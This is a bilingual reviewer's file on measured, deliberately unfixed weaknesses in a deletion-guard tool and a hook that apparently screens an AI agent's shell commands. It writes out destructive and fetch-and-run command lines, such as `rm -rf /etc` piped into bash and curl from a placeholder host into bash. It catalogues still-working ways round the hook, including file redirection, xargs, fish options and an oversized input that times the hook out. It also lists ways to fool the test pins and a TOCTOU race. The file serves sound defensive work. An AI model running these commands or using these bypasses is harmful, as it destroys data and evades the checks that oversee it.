# Known residuals — measured, deliberately unfixed

這個檔案是給**下一個審查者**看的，不是給使用者看的。

下面四項都經過實測、都是既有殘留、都刻意沒修。如果一次 review 又「發現」它們，
那是重複勞動——先讀這裡的理由，再決定要不要推翻它。

R1–R3 各有 `test-better-rm.sh` 裡的一個測試釘著，而且那個測試是**雙向**的：
文字不見了會紅，**底下的程式碼事實變了也會紅**。第二半是重點——它逼著「修好了
卻忘了刪這段文字」變成一次失敗，而不是一段悄悄過期的謊。

This file is for the **next reviewer**, not for users. All four items below are
measured, pre-existing, and deliberately unfixed. A review that "finds" them again
is repeating work already done — read the reasoning first, then decide whether to
overturn it. R1-R3 are each pinned by a test in `test-better-rm.sh`, and the pin is
**two-way**: it fails if the text disappears, and it also fails if the underlying
code fact changes. That second half is the point — it turns "fixed but forgot to
delete this note" into a failure rather than a quietly stale claim.

## 已知極限（實測，別高估這個釘子）

2026-08-19 的對抗驗收把這個釘子攻擊過一輪，**三個洞是量出來的，不是推測的**：

1. **抓不到原地否定。** 在下面插一句「以上作廢、重新開單」而不動任何 anchor，
   測試照樣綠。grep 型釘子的本質。
2. **抓不到把理由整段刪掉、只留 token。** 把 R1 的修法段落刪光、只在檔案結尾留
   一個孤零零的 anchor token（甚至塞在 HTML 註解或程式碼圍籬裡），照樣綠。
   **釘子看得到字串，看不到位置與上下文。**
   ⚠️ 所以**這份文件本身不得再出現任何 anchor token 的第二份字面拷貝**——寫這段
   警告的第一版就犯了這個錯（在這裡多寫了一次 R1 的 token），結果整個 R1 段落被
   刪掉時測試照樣綠。警告自己變成了它警告的那個洞。要提到 anchor 就描述它，別
   照抄它。這條現在由測試強制（每個 anchor 精確計數必須為 1），不再只是請求。
   ⚠️ 副作用要先知道：**R1–R3 是純中文的，哪天有人把它們鏡像成英文，anchor 就會
   出現第二次、釘子會紅。** 那不是誤報而是這條規則的直接後果——真要雙語就得同時
   改測試裡的 anchor 定義。
3. **程式碼那一半的「註解掉而不是刪掉」只補了一半。** 現在兩個程式碼 anchor 會先
   濾掉**行首**註解（`#` / `//`）再比對，所以那一種會紅。**其餘全都還是綠的**，
   實測：JS 的 `/* … */`（單行與跨行皆可）、bash 的 `: <<'EOF'` 區塊、把整行放進
   字串字面、bash 的 `if false; then … fi` 死碼包裹、以及**行尾註解**。
   ⚠️ 行尾註解那種最危險，因為它同時是「看起來已修好」的形狀：
   ```js
   const budgetMs = 9999;  // was: const budgetMs = 1000;
   ```
   `node --check` 過、釘子維持綠，**而預算已經被調大了**——正是 R3 明文說不要做的
   那個修法。bash 側同形：`:  # removed 2026-08-20: [ -O "$path" ] || return 1`。
   其餘同樣通得過的（實測，非推測）：bash 的 `:` no-op 前綴（`: [ -O … ] || return 1`，
   連註解都不用）、JS 的 `if (false) { … }`、以及把整行搬進一個沒人呼叫的函式裡
   ——最後這種看起來完全是活碼。
   **別把這半邊當成封死的。** 它擋的是最粗心的一種改法，不是有意的規避。

4. **精確計數本身有一個 BSD-only 的繞法：NUL 位元組 ＋ `LC_ALL=C`。** BSD `grep -o`
   碰到含 NUL 的檔案會印一行 `Binary file … matches`，於是 `wc -l` 永遠讀成 1，
   不論實際有幾份拷貝。實測完整攻擊（刪掉整個 R1 段落 ＋ 留兩個孤立 token ＋ 種一個
   NUL）在 `LC_ALL=C` 下 **136/136 全綠**。
   需要**同時**滿足兩個條件才成立：把 markdown 蓄意弄成二進位檔，且跑在 C/POSIX
   locale。少任一個都會紅（同攻擊無 NUL → 紅；有 NUL 但 UTF-8 locale → 紅）。
   ⚠️ **「git 會顯示成 binary 所以 review 看得到」這句話原本寫錯了，已更正**：
   git 只檢查**前 8000 bytes**，本檔已超過一萬 bytes，所以 NUL 塞在**檔尾**會得到
   一般文字 diff（實測 `numstat 4 24`），塞在**開頭**才會顯示 `- -`。攻擊者當然
   放檔尾。**這個繞法沒有「review 一定看得到」這道保險。**
   另一個當初寫錯的細節：control-2（NUL ＋ UTF-8 locale）之所以紅，機制與原本
   假設不同——ASCII 那個 anchor 仍數到 1，是兩個中文 anchor 讀成 0 才紅的。
   驗證腳本：`test/residual-harness/pin-nul-evasion.sh`（會把兩種放置位置都量）。
   ⚠️ CI 是 ubuntu（GNU grep），本機沒有 GNU grep 可測，**那一側的行為是推論不是實測**。

還有一個環境陷阱：兩個程式碼 anchor 用的是 `grep -v … | grep -q …`，在 `better-rm`
上前段會提早 SIGPIPE，整條管線回 141。這個測試檔目前沒開 `pipefail` 所以無害，
但**哪天有人給這套加上 `set -o pipefail`，這個釘子會永久變紅**。

還有一個已知的假陽性：對 `[ -O ]` 做語意不變的改寫（例如換個等價寫法）會讓釘子
變紅，而診斷訊息會說「已不在活碼裡」——方向是安全的（寧可誤報），但那句話當下
是錯的。看到它請直接看程式碼，別信訊息字面。

Stated limits, all measured on 2026-08-19: a prose pin catches deletion but not
in-place negation (1), and not wholesale removal of the reasoning as long as the
token survives anywhere in the file (2). The code-side half was ALSO defeatable by
commenting the line out rather than deleting it, and that is only **half** closed
(3): line-leading `#` / `//` now fails the pin, but everything else still satisfies
both code anchors, measured green — a JS `/* … */` block (single- or multi-line),
a bash `: <<'EOF'` block, the line inside a string literal, an `if false; then … fi`
wrapper, and **a trailing comment**. The trailing-comment form is the dangerous one
because it is also the shape a wrong fix takes: `const budgetMs = 9999;  // was:
const budgetMs = 1000;` passes `node --check`, keeps the pin green, and has raised
the budget — exactly what R3 says not to do. Do not read the code-side half as
sealed; it catches the careless edit, not the deliberate one.
One known false positive: a semantics-preserving rewrite of the ownership clause
trips the pin with a diagnostic that is then literally wrong.

---

## R1 — 日誌綁定檢查是 TOCTOU-racy（same-UID）

`log_file_is_bound()` 驗的是**路徑**：`[ -L ]` / `[ -f ]` / `[ -O ]` / link 數
都對路徑做，通過之後 `log_deletion` 才用同一個路徑去 append。兩者之間有窗口，
並行行程可以把 symlink 換進來，append 就跟著走過去。

**實測命中率隨 harness 的積極程度大幅變動**，這是 TOCTOU 的正常現象。三組獨立
harness 量到的範圍：**7.3% / 8.0% / 28.7%(43/150) / 50.7%(76/150) / 72.0% / 96.7%**
（2026-08-18 與 08-19，皆為同 UID racer）。
**所以任何單一數字都只描述那個 harness，不描述這個洞的難度**——別把 43/150 當成
上限，也別當成下限。要判斷風險請看前提條件，不是看比率。

**為什麼不修**：目前 state dir 是 0700、使用者自有，攻擊者要先有同 UID 的執行
能力——那個前提下他本來就能直接改日誌。風險真正上升的情境是
`BETTER_RM_STATE_DIR` 被指到共用位置。

**要修的話，正確方向是**：用 `O_NOFOLLOW|O_APPEND` 開一次，然後驗**那個 file
descriptor**（`fstat` 比對 mode / uid / nlink），全程用同一個 fd append。
**再加一道路徑檢查是沒有用的**——那只是把窗口變窄，不是關掉。

在 stock `/bin/bash` 3.2.57 上 `{fd}>>` 不可用、`/dev/fd/N` 讀出來是 mode 200，
所以純 bash 大概做不到；真要做需要一支小 helper。這是它沒被順手修掉的原因。

---

## R2 — `[ -O ]`（擁有者）那一條無法在無 root 的情況下測試

四個 clause 裡，`[ -L ]`（symlink）、`[ -f ]`（一般檔／FIFO 無限 hang）、
link 數（hard link）都有會紅的測試。**`[ -O ]` 沒有**：把它刪掉，整套
`test-better-rm.sh` 照樣全綠。

⚠️ **這句自 `5e295ef` 起不再字面成立**：那個 commit 教會釘子去 grep 活碼，所以刪掉
`[ -O ]` 現在會讓**釘子**變紅。但**行為覆蓋依然是零**——紅的是「文件與程式碼不同步」
那條，不是任何真的行使 ownership 的測試。驗證腳本會把這個差別分成 `CAUGHT`
（真有行為測試抓到）與 `PIN-ONLY`（只有釘子叫）兩種判定，`[ -O ]` 是後者：
`test/residual-harness/mutants-log-binding.sh`。

⚠️ **同一支腳本查出一個新的、更值得注意的缺口**（2026-08-20，尚未修）：把
`[ -f "$path" ] || return 1` 收窄成 `[ ! -p "$path" ]`（也就是「只擋 FIFO」的
trimmed 版本）**逃過全部 136 個測試**。可觀察的後果是**一個 socket 被當成合法日誌
靜默接受**。原因是 FIFO 那個測試釘的是「不會卡住」，不是「必須是一般檔」。
要修得在 `test-better-rm.sh` 加一個 socket fixture；本輪刻意不動既有測試檔，故記錄不修。

**為什麼沒補測試**（經獨立重新推導，不是採信）：

- `chown` 給 nobody／daemon／uid 1／65534 全部 EPERM。
- 但**「別的 UID 擁有的檔案」本身做得出來**：`ln /etc/hosts <0700 state dir>/deletion.log`
  回 0，得到一個 root 擁有、regular、就在使用者自有目錄裡的檔案。早先版本說這
  「寫不出來」是**錯的**。
- 真正做不出來的是 **`nlink == 1` 的那一種**。hardlink 必然 `nlink >= 2`，所以
  這條路徑會被 link 數那一條擋掉——**把 `[ -O ]` 整條刪掉，同一個 fixture 產生的
  輸出逐字相同**（實測：shipped 與 noO 兩版都印同一句拒絕訊息）。
- 順帶更正一個容易寫反的細節：shipped 的檢查順序是 `[ -L ]`→`[ -f ]`→`[ -O ]`→link 數，
  所以 hardlink fixture 實際上是**先被 `[ -O ]` 擋下**的。這不影響結論——重點是
  刪掉 `[ -O ]` 之後 link 數那條會擋下同一個 fixture，所以它觀察不到差別。

**結論成立、機制別寫反**：hardlink 路線無法偵測 `[ -O ]` 是否還在，不是因為
nlink 先觸發，而是因為兩條 clause 對這個 fixture 給出相同結果。

**處置：已知不可測、接受。** 不要為了讓覆蓋率好看去硬寫一個測不到真實條件的
測試——那種測試的唯一效果是讓下一個人以為這裡有防護。

---

## R3 — `test-hooks.js` 的 1000ms 預算是負載敏感的（兩邊都紅是常態，不是回歸）

`test-hooks.js` 裡 `const budgetMs = 1000;` 那段用牆鐘時間斷言 6000 個 `-exec`
子句仍在預算內被拒絕。**在負載下它會紅。**

**2026-08-18 實測**：12 個 spinner 下，`88e6611` 與 `ca02eca` **兩個 commit 都
3/3 紅**（1185/1606/1280ms vs 1213/1117/1118ms），而 `test-hooks.js` 在兩個
commit **逐位元組相同**。閒置時兩邊都綠。

**所以：這是負載相依、對稱、既有的問題。不要歸因給任何近期改動。** 這一點被三
份獨立報告各自誤判過一次，才由第四次獨立查證釐清。

**為什麼還沒修**：它在 pre-push gate 裡是真的負債（會隨機擋住推送），但正確修法
是換成不看牆鐘的寫法（例如比較有／無 padding 的相對成本，或直接斷言解析複雜度
上界），不是把 1000 改大——那只是把翻紅的負載門檻往上移。

## R4 — carrier 的腳本從 pipe 或 process substitution 進來時，不會被掃描
## （2026-09-03 CLOSED-WITH-EXCEPTION-LIST；剩下的部分改列為 R4-b）

**原本的問題**（2026-09-03 實測，全部放行，走真正的 stdin 進入點，payload 是 touch 不是
刪除，標記檔在 /bin/bash 3.2.57 與 5.3.15 下都出現，所以這些命令是真的會執行）：

```
echo "rm -rf /etc" | bash
printf %s "rm -rf /etc" | sh
echo rm -rf /etc | sudo bash
echo "rm -rf /etc" | bash -s
echo "rm -rf /etc" | tee /dev/null | bash
echo "rm -rf /etc" | source /dev/stdin
bash <(echo "rm -rf /etc")
curl -sSL https://example.invalid/install.sh | bash
```

對照組：逐位元組等價的 heredoc 寫法 `cat <<EOF | bash` 是**拒絕**的，here-string 寫法
`bash <<< "rm -rf /etc"` 也是。差別只在腳本從哪裡進來。

**裁決與修法**：使用者於 2026-09-03 裁決採用那條成立的規則，並附一份豁免清單
（FOLLOWUP.md 決定 1）。規則是：**carrier 的腳本從 pipe 或 process substitution 進來時，
這道閘門必須讀得到它，否則拒絕執行**。讀得到的只有兩種產生器——字面產生器
（`echo`／`printf` 的非動態字、`cat <<EOF`，其文字會當成巢狀命令判定）與
`hooks/protect-important-paths.js` 裡 `PIPED_SCRIPT_EXCEPTIONS` 上的網址前綴；
其餘一律拒絕，**包含解析器分類不出來的產生器**（沒有 fail-open 的分支）。
上面八列現在全部是拒絕，README.md 記載的四條安裝路徑仍然放行。

**這條規則新擋掉什麼，明講**：其他專案的 `curl … | sh` 一行安裝法、`cat script.sh | bash`、
`echo "$cmd" | bash`、中繼段（`… | tee f | bash`、`… | sed … | bash`）、
`source <(kubectl completion bash)` 這類 completion 慣用寫法，以及 `( … ) | bash` 這種
複合產生器。清單與繞法寫在 README.md「從 pipe 或 process substitution 進來的腳本會被拒絕」
那一節，訊息本身也會寫。

**豁免清單的性質，明講**：它比對的是命令列上的網址文字，不是身分驗證——任何能寫命令的人都
能寫出那個前綴，閘門也無法驗證伺服器回什麼。它的職責只是不讓這條規則擋掉本專案自己記載的
安裝方式。收窄條件（單一網址操作元、拒絕 `..`／百分號逃逸、選項白名單）記在 README.md 與
`hooks/protect-important-paths.js` 的常數註解裡，理由是實測：`--connect-to`／`--resolve`／
`--proxy`／`--unix-socket`／`-K`／`-o` 都能在網址文字逐位元組相符的情況下把抓取搬到別處。

**雙向釘**：`test-hooks.js` 的 `pipedScriptBlocked`／`exceptionListControls`（走真正的 stdin
契約，並斷言拒絕理由的文字含 `unscannable piped script` 與 `PIPED_SCRIPT_EXCEPTIONS`）、
`installRouteAllowances`（四條記載的安裝路徑，並比對 README.md 真的有這四條），以及
`blocked`／`allowed` 裡的字面產生器與誤擋對照列。規則消失、訊息爛回舊措辭、或豁免清單被放寬
成裸 host，這三件事各自會讓測試轉紅。

**R4 — closed with an exception list, 2026-09-03.** A shell carrier whose script
arrives on a pipe or through a process substitution is refused unless this gate
can READ that script: a literal emitter (`echo`/`printf` words, `cat <<EOF`) is
scanned as a nested command and judged by the ordinary rules, an install route on
`PIPED_SCRIPT_EXCEPTIONS` is let through, and everything else -- including a
producer the parser cannot classify -- is refused with a message that names the
rule (`unscannable piped script`) and the list to extend. All eight spellings
above, measured ALLOW that morning through the real stdin entry point with the
deletion replaced by a touch, are refused now; the four install routes README.md
documents still pass. The exception list matches URL TEXT and is not an identity
check, which is why an exempted fetch may carry only options that cannot move it.

## R4-b — 這條規則刻意沒有涵蓋的部分

以下每一列都是 2026-09-04 走真正的 stdin 進入點量出來的**放行**，不是推論：

- `bash < script.sh`、`bash script.sh`——重導向或操作元指向真正的檔案。
- `bash -c "$(curl …)"`、`eval "$(curl …)"`——**只在沒有 pipe 餵著時**。有 pipe 的
  `curl … | bash -c "$(cat)"` 從 2026-09-04 起是拒絕的。
- `… | xargs -I{} bash -c "{}"` 與 `… | xargs -0 bash -c`：`-c` 的命令字串是 xargs 從 pipe
  補上去的，這道閘門看到的 `-c` 後面根本沒有字。
- `bash <&3`——fd 3 由別處開啟，而且不是 process substitution 開的。
  `bash /dev/fd/3 3< <(curl …)` 與 `exec 3< <(curl …); bash /dev/fd/3` 那一族已於
  2026-09-04 納入。
- `curl … > >(bash)`——輸出方向的 process substitution，刻意不視為腳本來源。
- `curl … | busybox sh`、`| python3`、`| perl` 等非 shell（或還要再拆一層 applet）的消費端。

使用者的裁決指名的是 pipe 與 process substitution，而豁免機制是網址形狀而不是路徑形狀；
把檔案與 fd 那一族納入是另一次姿態改變，範圍大得多（每一個 `bash < f` 都會被擋），該分開問。

**代價，明講而不是藏著**：`cat f | bash` 被拒，而只差一個字元的 `bash < f` 沒有。知道規則的
人繞得過去，所以 R4 買到的是「閘門不再對一種常見寫法視而不見」，不是「對手拿不到執行」。

**「腳本文字看得見、但裡面的命令替換看不見」這一類，涵蓋到哪裡為止**（實測，不是推論）：
carrier 自己的 here-string 與 heredoc 內文（`bash <<< "$(curl …)"`、`bash <<EOF` 內文寫著
`$(curl …)`）、字面 heredoc 產生器的內文（`cat <<EOF | bash` 內文寫著 `$(curl …)`），以及
**有 pipe 餵著時**的 `-c` 引數（`curl … | bash -c "$(cat)"`，2026-09-04 補上）都會拒絕；
良性的 `bash <<EOF` + `echo hi` 仍然放行。

**這裡先前寫著「兄弟站點已全部納入」，那句話是假的，已刪除**：寫下它的當天
`curl … | bash -c "$(cat)"` 是放行的，而它正是同一類的兄弟站點（腳本文字看得見、裡面的替換
看不見），2026-09-04 才補上。範圍外的部分改成下面那份逐列量過的清單，不再用「全部」這種詞。

**R4-b — deliberately out of scope.** `bash < file`, `bash script.sh`,
`bash -c "$(curl …)"`, `eval "$(curl …)"`, `… | xargs -I{} bash -c "{}"`,
`bash <&3`, and non-shell consumers such as `curl … | python3`. The decision named
pipes and process substitutions, and the exemption mechanism is URL-shaped rather
than path-shaped; folding in the file/fd family is a second, much larger posture
change and should be asked separately. Every item above was measured ALLOW on
2026-09-04 through the real stdin entry point; none of them is reasoned about.
"The script text is visible but a command substitution inside it is not" is
covered on the carrier's own here-string and heredoc body (`bash <<< "$(curl …)"`,
`bash <<EOF` with `$(curl …)` in it), on a literal heredoc producer's body
(`cat <<EOF | bash` with `$(curl …)` in it) and, since 2026-09-04, on the `-c`
argument of a PIPE-FED carrier (`curl … | bash -c "$(cat)"`), while the benign
`bash <<EOF` / `echo hi` twin stays allowed. This paragraph used to claim those
sibling sites were ALL covered; that sentence was false when it was written --
`curl … | bash -c "$(cat)"` was allowed at the time and is the same class -- and
it is deleted rather than softened, because a residuals document that overstates
its own coverage is the one thing this file exists to prevent.

## R4-c — carrier 選項的「吃掉下一個字」只覆蓋 bash/sh 系的拼法

`hooks/protect-important-paths.js` 的 carrier argv 走訪會吃掉 `-O`／`+O`／`-o`／`+o`／
`--rcfile`／`--init-file` 的引數（判斷是 `/^[-+][A-Za-z]*[Oo]$/` 加那兩個長選項），涵蓋
`bash --help` 的 invocation-only 那一整組，以及 sh／dash／zsh／ksh 的 `-o`。**fish 自己那組
帶引數的選項不在內**：實測 2026-09-04，`curl -sSL <url> | fish -d 3` 與 `| fish --debug 3`
都是**放行**，因為 `3` 被讀成腳本檔操作元；同一條命令去掉那個選項（`curl … | fish`）是拒絕。

**為什麼不順手修**：正確的修法不是再往那條形狀正則裡多塞幾個字串，而是每個 carrier 各有一份
「會吃掉下一個字」的選項表——那是一份會隨上游漂移的資料，每加一個名字都得配一列實測的測試，
而且加錯方向（少吃一個字）就是一個新的 fail-open。fish 在這台機器上不是 login shell，
`~/bin` 與 launchd 也沒有任何 `| fish` 的用法，所以這一項留著並寫下來，不假裝已經涵蓋。

**R4-c — the option-argument walk covers the bash/sh spellings only.** The carrier
argv walk consumes the argument of `-O`/`+O`/`-o`/`+o`/`--rcfile`/`--init-file`,
which is the whole invocation-only group in `bash --help` plus the `-o` of
sh/dash/zsh/ksh. fish's own argument-taking options are NOT covered: measured
2026-09-04, `curl -sSL <url> | fish -d 3` and `| fish --debug 3` are ALLOWED,
because `3` is read as the script FILE operand, while the same command without the
option (`curl … | fish`) is refused. The right fix is a per-carrier table of
options that consume the next word -- upstream-drifting data that needs a measured
row per name, where getting it wrong in the consuming direction is a new fail-open
-- and fish is not a login shell on this machine and nothing in `~/bin` or launchd
pipes into it, so this is written down rather than pretended away.


## R5-a — 斷詞階段的 `$(` 平方級成本仍在，而唯一的完整解法是輸入長度上限（**未裁決**）

判定預算（`JUDGING_BUDGET_MS = 2000`）是在 `commandTargets()` **之後**才設 deadline 的，
所以**斷詞本身不在預算內**。2026-09-04 補上的失敗讀取預算
（`MAX_FAILED_SUBSTITUTION_READS = 64`）只封住 `shellWords()` 裡那三個雙引號內的 reader；
`commandSubstitutions()` 用的 `readParenthesized()` 仍然是既有的平方級成本。

實測（走真正的 stdin 進入點，命令是 `echo "` + 開頭字 ×n + `" ; rm -rf /etc`，同一台 Mac）：

| 形狀 | 39KB | 78KB | 117KB |
|---|---|---|---|
| `${`，修復前 | 811ms | 2,791ms | 6,071ms |
| `${`，修復後 | 36ms | 45ms | 52ms |
| `$(`，修復前 | 4,117ms | 17,995ms | 37,015ms |
| `$(`，修復後 | 2,083ms | 8,232ms | 18,355ms |

`${` 那一半是 2026-09-03 的 tokenizer 修復帶進來的回歸，已經修掉。`$(` 那一半**不是**：
在該修復之前的版本上，78KB 就已經要 11,513ms，早就超過 live hook 的 5,000ms 逾時，而
**逾時的 PreToolUse hook 不做任何裁決、也不會擋下命令**——同一行後面的刪除會不受判定地執行。

**為什麼沒有順手修**：三條路都試算過。
（a）把 `readBraced` 改成線性需要一個把「每次呼叫都重新開始的引號／跳脫狀態」重現出來的堆疊
掃描，那是在一個活的安全檔案裡重寫斷詞器，而且它**碰不到** `$(` 這一半。
（b）審查報告建議的 `noCloserBeyond` 記憶化是**不成立的**：拿這個檔案自己的 `readBraced`
反證，輸入 `${${}` 時 `readBraced(.,1)` 回 `null` 而 `readBraced(.,3)` 回 `4`——後面的開頭
可以收尾，前面的卻不能，所以「越過某點就沒有收尾」這個前提是假的。**不要照那個處方實作。**
（c）**輸入長度上限 + fail-closed 的「太長，不予判定」拒絕**能把兩半一起封住，但它是**姿態
改變**：實測最壞形狀在 16KB 是 746ms、32KB 是 2,883ms、64KB 是 12,363ms，而判定預算最多再加
2,000ms，所以只有 16KB 左右才有真正的餘裕——而 16KB 的上限會在整台機器上誤擋合法的長命令。

**這是使用者的裁決，不是修復者的**，因此留在這裡等一個明確的決定：要不要上一個輸入長度上限、
上限訂在哪裡，以及被擋掉的長命令改怎麼寫。

**R5-a — the pre-existing `$(` quadratic in the TOKENIZER is still there, and the
only complete fix is an input-size cap (UNDECIDED).** The judging budget's deadline
is set AFTER `commandTargets()`, so tokenizing is outside it. The failed-read budget
added 2026-09-04 (`MAX_FAILED_SUBSTITUTION_READS = 64`) bounds only the three
in-double-quote readers in `shellWords()`; `readParenthesized()` inside
`commandSubstitutions()` keeps the pre-existing cost. Measured through the real
stdin entry point, `echo "` + opener x n + `" ; rm -rf /etc`: the `${` shape went
6,071ms -> 52ms at 117KB (that half was a regression introduced by the 2026-09-03
tokenizer fix and is now gone), while `$(` went 37,015ms -> 18,355ms and was
ALREADY past the live 5,000 ms timeout at 78KB before that fix (11,513ms) -- and a
PreToolUse hook that outruns its timeout produces no decision, so the deletion on
the same line runs unjudged. Three routes were costed: making `readBraced` linear
is a tokenizer rewrite in a live security file that does not touch the `$(` half;
the `noCloserBeyond` memo a review suggested is UNSOUND, disproved against this
file's own `readBraced` (`${${}`: index 1 returns null, index 3 returns 4, so a
LATER opener can close where an earlier one cannot -- do not implement it); and an
input-size cap with a fail-closed "too long to judge" refusal would bound both
halves but is a POSTURE CHANGE (measured at HEAD: 16KB -> 746ms, 32KB -> 2,883ms,
64KB -> 12,363ms, plus up to 2,000ms of judging on top, so only a ~16KB cap has real
margin, and a 16KB cap falsely refuses legitimate long commands machine-wide). That
is the user's call, not a fixer's, and it is written here rather than shipped.

## R5-b — 產生器標籤取自 `path.basename()`，只有豁免那一支被收窄

2026-09-04 起，`curl`／`wget` 的安裝路徑豁免要求產生器是「前面什麼都沒有、而且不帶路徑」的
赤裸命令字（見 README「比對還有四個收窄條件」第 4 點）。**這個收窄只套用在豁免那一支**：
檔案裡其他地方（外殼拆解、carrier 判定）照舊用 `path.basename()` 比對名字，而在那些地方
「名字對了就當成 shell」是 **fail-closed** 的方向——多認一個名字只會多一次拒絕，不會多一次
放行——所以刻意不動。

**R5-b — the producer label still comes from `path.basename()` everywhere except
the exemption.** Since 2026-09-04 the curl/wget install-route exemption requires a
BARE, unprefixed, unpathed producer word. That narrowing is deliberately confined to
the exemption: elsewhere in the file (wrapper unwrapping, carrier detection) a
basename match is the FAIL-CLOSED direction -- recognising one more name costs a
refusal, never an allowance -- so it is left as it is.
